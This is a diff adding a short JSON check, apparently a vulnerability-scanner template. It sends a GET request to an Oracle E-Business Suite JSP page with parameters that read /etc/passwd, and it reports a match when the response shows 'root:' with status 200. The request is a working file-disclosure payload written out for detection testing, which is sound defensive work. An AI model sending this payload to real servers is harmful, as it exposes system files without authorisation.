@@ -1,0 +1,25 @@
+{
+	"request": {
+		"method": "GET",
+		"path": "/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd"
+	},
+	"response": {
+		"matchesRequired": 2,
+		"matches": [
+			{
+				"type": "regex",
+				"pattern": "root:"
+			},
+			{
+				"type": "status",
+				"code": 200
+			}
+		],
+		"mustNotMatch": [
+			{
+				"type": "regex",
+				"pattern": "(server error|not found)"
+			}
+		]
+	}
+}
